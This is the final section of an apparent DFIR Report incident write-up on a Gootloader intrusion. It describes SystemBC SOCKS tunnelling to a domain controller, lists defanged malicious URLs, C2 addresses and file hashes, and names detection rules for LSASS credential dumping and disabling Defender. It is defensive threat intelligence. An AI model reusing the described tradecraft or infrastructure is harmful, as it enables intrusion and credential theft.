<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-087.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28415" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-087.png" alt="" width="425" height="135" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-087.png 425w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-087-300x95.png 300w" sizes="(max-width: 425px) 100vw, 425px" /></a></p>







<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-088.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28416" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-088.png" alt="" width="1709" height="116" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-088.png 1709w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-088-300x20.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-088-1024x70.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-088-768x52.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-088-1536x104.png 1536w" sizes="(max-width: 1709px) 100vw, 1709px" /></a></p>
<p>Using that key to decrypt the first answer packet shows that this is SOCKS v5 traffic and it also reveals the domain:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-089.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28417" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-089.png" alt="" width="299" height="155" /></a></p>





<pre>x05 -&gt; Version 5 <br />x01 -&gt; Command Code 1 <br />x00 -&gt; Reserved <br />x03 -&gt; Address Type <br />x05 -&gt; Length of Domain (domain name redacted)</pre>



<p>Approximately four minutes after the script was dropped, SOCKS (SystemBC) was utilized to tunnel network connections from the external IPv4 91.92.136[.]20:4001 to the domain controller via a compromised endpoint. The endpoint was configured to execute a PowerShell script [s5.ps1] that established a SOCKS connection to the attacker-controlled infrastructure.</p>



<p>The process and C2 activity can be illustrated as:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-090.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28418" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-090.png" alt="" width="772" height="156" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-090.png 772w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-090-300x61.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-090-768x155.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-090-765x156.png 765w" sizes="(max-width: 772px) 100vw, 772px" /></a></p>





<p>The script had the following indicators for the IPv4 and Port:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-091.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28419" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-091.png" alt="" width="228" height="37" /></a></p>





<p>The SOCKS tunnel provided the following connectivity from the attacker computer and allowed RDP [3389] to be traversed externally.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28699" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1.png" alt="" width="1145" height="281" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1.png 1145w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1-300x74.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1-1024x251.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-092-1-768x188.png 768w" sizes="(max-width: 1145px) 100vw, 1145px" /></a></p>
<p>&nbsp;</p>





<p>A side effect of utilizing a proxy (SOCKS tunnel) on the endpoint is unusual port allocations, for example, PowerShell talking to port 3389. In this case, RDP was used to tunnel to the Domain Controller via the PowerShell process, which used port 3389.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-093.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28421" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-093.png" alt="" width="856" height="282" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-093.png 856w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-093-300x99.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-093-768x253.png 768w" sizes="(max-width: 856px) 100vw, 856px" /></a></p>





<p>The activity did expose the attacker&#8217;s computer name via Windows eventID 4778, with the name being &#8216;DESKTOP-GRALDC5&#8217;. The client address referred to the proxy endpoint, an private IPv4 address.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-094.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28422" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-094.png" alt="" width="363" height="140" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-094.png 363w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-094-300x116.png 300w" sizes="(max-width: 363px) 100vw, 363px" /></a>During the intrusion we also observed a second hostname appear &#8216;HOME-PC.&#8217; This was also found via RDP access related logins.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-101.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28542" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-101.png" alt="" width="718" height="323" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-101.png 718w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-101-300x135.png 300w" sizes="(max-width: 718px) 100vw, 718px" /></a></p>





<p>Based on the SRUM (System Resource Utility Monitor), with the SOCKS tunnel utilized, the attacker was most active from 0600 UTC to 1100 UTC on the second day of the intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-095.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28423" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-095.png" alt="" width="958" height="342" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-095.png 958w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-095-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-095-768x274.png 768w" sizes="(max-width: 958px) 100vw, 958px" /></a></p>





<p>During the intrusion, it was observed that two different attacker computer names were used, &#8216;DESKTOP-GRALDC5&#8217; and &#8216;HOME-PC&#8217;.</p>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-098.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28430" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-098.png" alt="" width="4008" height="5212" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-098.png 4008w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-098-231x300.png 231w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-098-787x1024.png 787w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-098-768x999.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-098-1181x1536.png 1181w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-098-1575x2048.png 1575w" sizes="(max-width: 4008px) 100vw, 4008px" /></a></p>
<p>



</p>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28703" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1.png" alt="" width="4392" height="2382" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1.png 4392w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1-300x163.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1-1024x555.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1-768x417.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1-1536x833.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-100-1-2048x1111.png 2048w" sizes="(max-width: 4392px) 100vw, 4392px" /></a></p>
<p>&nbsp;</p>
<p>






<p>Submit your <a href="https://forms.office.com/r/MwZXkBrUNv" target="_blank" rel="noopener">feedback</a> on this report for a chance to win free swag!</p>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>



<h3 class="wp-block-heading">Atomic</h3>
<pre>Gootloader
hxxps[:]//hrclubphilippines[.]com/xmlrpc.php
hxxps[:]//mediacratia[.]ru/xmlrpc.php
hxxps[:]//daraltanweer[.]com/xmlrpc.php
hxxps[:]//ukrainians[.]today/xmlrpc.php
hxxps[:]//my-little-kitchen[.]com/xmlrpc.php
hxxps[:]//montages[.]no/xmlrpc.php
hxxps[:]//pocketofpreschool[.]com/xmlrpc.php
hxxp[:]//blog[.]lilianpraskova[.]cz/xmlrpc.php
hxxps[:]//sitmeanssit[.]com/xmlrpc.php
hxxp[:]//artmodel[.]com[.]ua/xmlrpc.php

Cobalt Strike
91.215.85[.]143:443

SystemBC C2
91.92.136[.]20:4001
</pre>





<h3 class="wp-block-heading">Computed</h3>



<pre>Implied_employment_agreement_70159.zip
fb6e4f75763fad6d0e7fe85a563b0c24
7e8543f2bc09bf320510fde5e34e32065339d9d2
873dd1dcdfcbe9826b274c5880f5be81a878ee93715fbb18a654d9dba61c5dfc

implied employment agreement 24230.js
deb24dfaf8178fda2d070aba9134a30c
ecc0b26106703e129fb1e2ec132c373870c2e7b6
f94048917ac75709452040754bb3d1a0aff919f7c2b4b42c5163c7bdb1fbf346

Frontline Management.js
4f4ee823a8c7e2511f05b3ea633c0d2c
877515fecc14ed193167e8a20c6b9a684a74564d
ecc7f13c3f0f8d4775e05715810b0164c52b7bd233e4a2e4f5a37769becb0092

stage1 (geRBAdXTDCkN)
md5sum payload1.dll_: 25b38e45df3cd215386077850c59be07
sha1sum payload1.dll_: a88a28c73aa42956c9f9d12585a8de63d4a00e47
sha256sum payload1.dll_: 68dd1a2da732d56b0618f8581502fcf209b1c828c97d05f239c98d55bb78b562 

stage2 (cbkSBtbjQBNFy)
md5sum payload2.exe_: 1b8b4f05058ac39091b99cc153ab00c0
sha1sum payload2.exe_: e0b568a3e35257cd30b0c42727c3529cef13b081
sha256sum payload2.exe_: 831955bd05186381a8f15539a41f48166873eab3feb55fb1104202e4152bd507 

e544944.exe - CS  beacon
md5sum e544944.exe: f769cb73317421c290832777c9e14f92
sha1sum e544944.exe: f043898fc9db6985c4ad8bb84669c081cdaa8e6f  e544944.exe
sha256sum e544944.exe: 40c40495434bf987b04f0742c3e9201189675d87a042aa72abbd0084c3de66d8
imphash: 49145e436aa571021bb1c7b727f8b049

5d78365.exe - CS beacon
md5sum 5d78365.exe: 9f9c7b2c8f245e62a08bf5f8a3eb3498 
sha1sum 5d78365.exe: 3cf851eb09c934cafe9b98d4706f903dff804b0c 
sha256sum 5d78365.exe: aad75498679aada9ee2179a8824291e3b4781d5683c2fa5b3ec92267ce4a4a33
imphash: 49145e436aa571021bb1c7b727f8b049

dae50de.exe - CS beacon
md5sum dae50de.exe: a617e6687ab5d747c530b930bb4a3209
sha1sum dae50de.exe: d53e550b54c08606e19965a9f74bbaa7063e10f1
sha256sum dae50de.exe: be3222219f029b47120390b2b1ad46ae86287e64a1f7228d6b2ffd89345a889e 
imphash: 49145e436aa571021bb1c7b727f8b049

a4a2ea4.exe - CS beacon
md5sum a4a2ea4.exe: e9fc0203d1dea15dff56a285d0f86b62
sha1sum a4a2ea4.exe: 72076af2ce8df6f8b1121c38f3c3db043c540369
sha256sum a4a2ea4.exe: 792a95234b01c256019b16a242b9487b99e98ed8a955eaecf1e44b0141aa12f4
imphash: 49145e436aa571021bb1c7b727f8b049</pre>





<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>



<h3 class="wp-block-heading">Network</h3>



<pre>ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET POLICY PE EXE or DLL Windows file download HTTP
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB Executable File Transfer
ET MALWARE SystemBC Powershell bot registration
ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement
ET HUNTING Possible Powershell .ps1 Script Use Over SMB
ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File
ET POLICY Possible Powershell .ps1 Script Use Over SMB
ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement
ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement
</pre>



<h3 class="wp-block-heading">Sigma</h3>



<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>



<p>DFIR Public Rules <a href="https://github.com/The-DFIR-Report/Sigma-Rules" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<pre>92f0538f-ad13-4776-9366-b7351d51c4b8 : Disable Windows Defender via Service
81cfbbae-5e93-4934-84a2-e6a26f85c7bb : JavaScript Execution Using MSDOS 8.3 File Notation
</pre>



<p>DFIR Private Rules:</p>
<pre>8537a157-5c6c-4173-9e65-943ff82c1efb : New Remote Access Configuration via netsh.exe<br />b17dc721-6e2d-4f2c-aaf5-4cbdcdfed6f5 : Remote Password File Access via Notepad or Wordpad</pre>



<p>Sigma <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<pre>d7a95147-145f-4678-b85d-d1ff4a3bb3f6 : CobaltStrike Service Installations - Security
3ef5605c-9eb9-47b0-9a71-b727e6aa5c3b : Use NTFS Short Name in Image
88f680b8-070e-402c-ae11-d2914f2257f1 : PowerShell Base64 Encoded IEX Cmdlet
1ec65a5f-9473-4f12-97da-622044d6df21 : Powershell Defender Disable Scan Feature
ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34 : Meterpreter or Cobalt Strike Getsystem Service Installation - Security
5ef9853e-4d0e-4a70-846f-a9ca37d876da : Potential Credential Dumping Activity Via LSASS
962fe167-e48d-4fd6-9974-11e5b9a5d6d1 : LSASS Access From Non System Account
a2863fbc-d5cb-48d5-83fb-d976d4b1743b : RDP Sensitive Settings Changed to Zero
d6ce7ebd-260b-4323-9768-a9631c8d4db2 : RestrictedAdminMode Registry Value Tampering
ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools
01aeb693-138d-49d2-9403-c4f52d7d3d62 : RDP Connection Allowed Via Netsh.EXE
</pre>



<h3 class="wp-block-heading">Yara</h3>



<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19530/19530.yar" target="_blank" rel="noopener">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19530/19530.yar</a></p>



<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-28701" src="https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1.png" alt="" width="3620" height="3116" srcset="https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1.png 3620w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1-300x258.png 300w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1-1024x881.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1-768x661.png 768w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1-1536x1322.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/02/19530-099-1-2048x1763.png 2048w" sizes="(max-width: 3620px) 100vw, 3620px" /></a></p>





<figure class="wp-block-image"></figure>



<p>Internal case #19530</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-28305" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-28305" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-28305" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-28305 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/" rel="prev">Buzzing on Christmas Eve: Trigona Ransomware in 3 Hours</a></div><div class="nav-next"><a href="https://thedfirreport.com/2024/03/04/threat-brief-wordpress-exploit-leads-to-godzilla-web-shell-discovery-new-cve/" rel="next">Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery &#038; New CVE</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/" /><input type="hidden" name="post_id" value="28305"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="a047e49feedfc240b75aad7c-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/02\/26\/seo-poisoning-to-domain-control-the-gootloader-saga-continues\/":28305};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form 